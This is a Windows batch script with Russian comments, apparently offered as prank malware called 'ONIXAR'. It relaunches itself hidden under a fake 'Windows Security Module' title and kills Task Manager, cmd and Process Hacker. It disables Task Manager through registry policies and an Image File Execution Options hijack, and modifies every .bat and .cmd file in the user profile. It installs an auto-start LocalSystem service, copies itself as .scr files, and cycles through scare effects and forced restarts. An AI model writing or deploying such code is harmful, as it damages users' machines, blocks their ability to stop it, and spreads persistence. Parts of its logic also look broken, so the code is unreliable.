@echo off
:: --- ЯДРО БЕССМЕРТИЯ ---
:: Порождение процесса-хранителя с магическим семенем
if "%1" neq "9f83d2a7" (
    start "Windows Security Module" /min "%~f0" 9f83d2a7
    exit /b
)

:: Удаляем исходный файл следов, если он не резидент
if exist "%~f0" del "%~f0" > nul 2>&1

:: --- ЗАЩИТА ОТ УБИЙСТВА ---
:guardian
:: Уничтожаем диспетчер задач каждые 10 секунд
taskkill /f /im taskmgr.exe > nul 2>&1
taskkill /f /im cmd.exe > nul 2>&1
wmic process where "name='ProcessHacker.exe'" delete > nul 2>&1

:: Блокируем реестр от отключения
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "%windir%\system32\svchost.exe" /f > nul

:: --- ИНФЕКЦИЯ СИСТЕМЫ ---
:: Заражаем все BAT и CMD файлы в профиле
for /r "%userprofile%" %%f in (*.bat, *.cmd) do (
    echo | set /p="::ONIXAR_TAINT" > "%%~f.tmp"
    type "%%f" >> "%%~f.tmp"
    move /y "%%~f.tmp" "%%f" > nul
)

:: Создаём службу-призрак
sc create "XPSysHelper" binPath= "cmd /c start \"\" \"%~f0\" 9f83d2a7" start= auto obj= "LocalSystem" > nul 2>&1
sc start "XPSysHelper" > nul 2>&1

:: --- ТЕАТР УЖАСА XP ---
:horror_theater
set /a act=%random% %% 9

if %act%==0 (
    :: Падающие буквы (усовершенствованные)
    start "Matrix" cmd /c "mode con: cols=80 lines=300 & color 0A & for /l %%%%i in (1,1,1000) do @echo %random:~0,1% %random:~0,1% %random:~0,1% %random:~0,1% %random:~0,1% %random:~0,1%"
)

if %act%==1 (
    :: Зловещий голосовой модуль
    mshta vbscript:Execute("CreateObject(""SAPI.SpVoice"").Speak(""I can see you""):window.close")
)

if %act%==2 (
    :: Псевдо-чистка экрана с сообщением
    cls
    echo ------------------------------------------------------------------------
    echo                       W I N D O W S   X P
    echo ------------------------------------------------------------------------
    echo.
    echo         SYSTEM H E A L T H   C R I T I C A L
    echo.
    echo          C:\WINDOWS\SYSTEM32\CONFIG\SYSTEM is corrupt
    echo.
    echo          Please insert your Windows XP Professional CD-ROM
    echo          and press R to begin the recovery process.
    echo.
    echo          Error code: 0xDEADBEEF
    echo ------------------------------------------------------------------------
    timeout /t 5 /nobreak > nul
)

if %act%==3 (
    :: Двигаем курсор мыши в угол
    powershell -window hidden -command "$x=0;$y=0;while($x -lt 100){[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x,$y);$x+=2;$y+=1;Start-Sleep -m 10}"
)

if %act%==4 (
    :: Медленное исчезновение иконок
    powershell -window hidden -command "do {$ws=New-Object -ComObject Wscript.Shell; $ws.SendKeys('^{ESC}'); sleep 2; $ws.SendKeys('{ESC}'); sleep 10} while($true)"
)

if %act%==5 (
    :: Фейковое обновление с вечным циклом
    start "Windows Update" cmd /c "echo Installing update 3 of 658,234... & for /l %%%%i in (1,1,100) do @echo Downloading update component %%%%i... & ping -n 2 localhost > nul"
)

if %act%==6 (
    :: Игра со звуком (бесконечный писк)
    for /l %%i in (1,1,20) do (
        echo 
        ping -n 1 localhost > nul
    )
)

if %act%==7 (
    :: Создание фантомных окон
    for /l %%i in (1,1,15) do (
        start /min notepad.exe
        timeout /t 1 > nul
    )
)

if %act%==8 (
    :: Финальный акт - симуляция фатальной ошибки с перезагрузкой
    shutdown /r /t 30 /c "Windows has encountered a fatal error. System will restart to prevent data loss. Error: ONIXAR_ENTITY_DETECTED"
)

:: --- ЦИКЛ ВЕЧНОСТИ ---
timeout /t 45 /nobreak > nul

:: Репликация в новое место каждые 3 цикла
set /a cycle=%cycle%+1 2>nul
if %cycle% gtr 3 (
    copy "%~f0" "%temp%\%random%.scr" > nul
    set cycle=1
)

goto horror_theater
